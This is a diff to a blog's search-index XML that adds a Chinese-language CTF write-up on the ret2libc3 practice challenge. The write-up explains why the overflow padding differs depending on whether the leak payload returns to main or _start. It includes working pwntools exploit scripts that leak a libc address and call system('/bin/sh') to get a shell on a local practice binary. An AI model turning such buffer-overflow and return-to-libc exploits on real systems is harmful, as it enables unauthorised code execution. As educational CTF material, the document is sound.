@@ -7,6 +7,158 @@
 ]]></content>
   </entry>
   <entry>
+    <title></title>
+    <url>/2024/04/16/%E3%80%90%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF%E3%80%91Ret2libc%E4%B8%AD%E7%9A%84main%E4%B8%8E_start%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="Ret2libc中的main与-start函数"><a href="#Ret2libc中的main与-start函数" class="headerlink" title="Ret2libc中的main与_start函数"></a>Ret2libc中的main与_start函数</h1><h3 id="1-题目背景"><a href="#1-题目背景" class="headerlink" title="1. 题目背景"></a>1. 题目背景</h3><p>Ret2libc3练习(<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3-CTF Wiki</a>)是一个简单的return to libc练习题，其通过向程序输入两次payload来get shell，第一次payload用于获取<code>__libc_start_main</code>函数真实加载地址，第二次payload通过该加载地址计算出libc中的偏移，进而调用<code>system</code>函数：</p>
+<span id="more"></span>
+<p><img src="/.com//image-20240416143243963.png" style="zoom: 80%;"></p>
+<p>第一个payload:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+
+puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment"># 0x08048460</span>
+libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span> <span class="token comment"># 0x0804a024</span>
+main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> <span class="token comment"># 0x08048618</span>
+
+payload1 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+base_addr <span class="token operator">=</span> libc_start_main_addr<span class="token operator">-</span>libc_start_main_offset
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[INFO]libc_start_main_addr:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[INFO]base_addr = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>第二个payload(与第一个payload在同一个文件):</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> system_offset
+str_bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> str_bin_sh_offset
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get shell"</span><span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>str_bin_sh_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>这里发现，如果payload1选择返回main函数，则payload2就是<code>b&#39;A&#39; * 104</code>，如果选择<code>_start</code>函数返回，则payload2就是<code>b&#39;A&#39; * 112</code>。</p>
+</blockquote>
+<h3 id="2-问题解析"><a href="#2-问题解析" class="headerlink" title="2. 问题解析"></a>2. 问题解析</h3><p>网上的资料解析如下：</p>
+<p><img src="/.com//image-20240416144221180.png" style="zoom:80%;"></p>
+<p>问题是，这个操作main函数里也有：</p>
+<p><img src="/.com//image-20240416144436368.png" style="zoom:80%;"></p>
+<p>并且该解释也没有说明payload2具体填充时到底是怎么错位了8 bit的。</p>
+<p>我们注意到_start函数和main函数都有如下语句<code>and esp, 0FFFFFFF0h</code>：</p>
+<p><img src="/.com//image-20240416182706318.png" style="zoom:80%;"></p>
+<p><img src="/.com//image-20240416182856052.png" style="zoom:80%;"></p>
+<p>但由于从_start到main涉及到了新函数栈的调用以及<code>__libc_start_main</code>调用，_start函数中对esp第八位置零作用不大（可能）。</p>
+<p><img src="/.com//image-20240416183119295.png" style="zoom:67%;"></p>
+<p>注意main函数开头的三句指令：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push    ebp
+mov     ebp, esp
+and 	esp, 0FFFFFFF0h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>这里令ebp=esp，并将esp的低八位置零，可能存在三种情况：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>ESP低八位</th>
+<th>三句指令后</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>esp == ebp</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ebp == esp + 4</td>
+</tr>
+<tr>
+<td>8</td>
+<td>ebp == esp + 8</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>这里分情况讨论再次进入main函数时的场景，注意再次进入main函数后，栈帧重新生成，数组S重新分配：</p>
+<ol>
+<li><p>ESP低8位为8：</p>
+<p><img src="/.com//image-20240416184120512.png" style="zoom:80%;"></p>
+<p>当运行至③时栈的结构如下：</p>
+<p><img src="/.com//image-20240416185626897.png" style="zoom: 67%;"></p>
+<p>可以看见由于esp比ebp开始就少了8字节，最后数组s的首地址距离返回地址108+4=112字节，payload2需要填充112字节。</p>
+<p>调试验证：</p>
+<p><img src="/.com//image-20240416190945992.png" alt></p>
+<p>从如果payload1从_start函数返回，则再次进入main函数时esp的后八位就为8，所以payload2需要填充112字节。</p>
+<ol>
+<li><p>ESP低8位为0：</p>
+<p>同理，如果第八位为0则payload2就填充128-28+4=104字节。如果payload1从man函数返回时，就是这种情况：</p>
+<p><img src="/.com//image-20240416191538952.png" alt></p>
+</li>
+<li><p>ESP低8位为4：</p>
+<p>如果ESP低8位为4（虽然此题没有这种情况），可以预见payload2需要填充128+4-28+4=108字节，使用IDA调试更改这个值来验证：</p>
+<p><img src="/.com//image-20240416193303822.png" alt></p>
+<p><img src="/.com//image-20240416192551479.png" style="zoom: 67%;"></p>
+</li>
+</ol>
+</li>
+</ol>
+<p>综上可以发现，造成不同payload长度的原因就是因为main函数开头构造栈帧时有一句特殊的<code>and esp, 0FFFFFFF0h</code>，从而导致不同的esp初始值需要不同的填充长度。</p>
+<h3 id="3-资料"><a href="#3-资料" class="headerlink" title="3. 资料"></a>3. 资料</h3><ul>
+<li><p>题目：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3-CTF Wiki</a></p>
+</li>
+<li><p>完整exp：</p>
+</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+
+ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+
+puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+libc_start_main_offset <span class="token operator">=</span> <span class="token number">0x01ade0</span>
+
+<span class="token comment">#print hex(puts_plt), hex(libc_start_main_got), hex(main)</span>
+<span class="token comment">#print "leak libc_start_main_got addr and return to main again"</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span> puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Can you find it !?'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+<span class="token comment">#print "get the related addr"</span>
+libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_start_main_addr = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>libc
+libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_start_main_addr = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#print("libc.symbols['__libc_start_main'] = ",hex(libc.symbols['__libc_start_main']))</span>
+system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_offset = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token operator">-</span>libc_start_main_addr<span class="token operator">+</span>libc_start_main_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
+base_addr <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc_start_main_offset
+a  <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    binsh_addr <span class="token operator">=</span> i
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_offset = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>binsh_addr<span class="token operator">-</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#print "get shell"</span>
+<span class="token comment">#sh.recvuntil(b'Can you find it !?')</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">104</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>References:<ul>
+<li><a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3-CSDN博客</a></li>
+</ul>
+</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
     <title>(技术积累)Fuzzm Heap&amp;Stack Instrumentation代码解析</title>
     <url>/2024/04/04/%E3%80%90%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF%E3%80%91Fuzzm%20Stack&amp;Heap%20Instrumentation%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
     <content><![CDATA[<h1 id="Fuzzm-Heap-amp-Stack-Instrumentation代码解析"><a href="#Fuzzm-Heap-amp-Stack-Instrumentation代码解析" class="headerlink" title="Fuzzm Heap&amp;Stack Instrumentation代码解析"></a>Fuzzm Heap&amp;Stack Instrumentation代码解析</h1><h2 id="1-instrument-with-heap-canary-check"><a href="#1-instrument-with-heap-canary-check" class="headerlink" title="1. instrument_with_heap_canary_check()"></a>1. instrument_with_heap_canary_check()</h2><blockquote>
